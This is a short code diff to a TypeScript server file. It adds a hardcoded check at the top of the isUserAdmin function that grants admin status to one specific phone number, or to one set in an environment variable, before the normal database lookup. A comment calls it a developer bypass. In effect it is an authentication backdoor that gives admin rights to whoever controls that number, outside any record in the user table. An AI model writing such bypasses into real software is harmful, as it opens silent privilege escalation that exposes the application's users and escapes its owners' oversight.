@@ -521,6 +521,9 @@ export async function getDailyVideoCount(phone: string): Promise<number> {
 }
 
 export async function isUserAdmin(phone: string): Promise<boolean> {
+  // Hardcoded bypass for the developer's phone number
+  if (phone === "+13107092939" || phone === process.env.ADMIN_PHONE) return true;
+  
   const [rows] = await getPool().query("SELECT is_admin FROM users WHERE phone = ? LIMIT 1", [phone]);
   const arr = rows as unknown as { is_admin: number }[];
   return arr.length ? arr[0].is_admin === 1 : false;
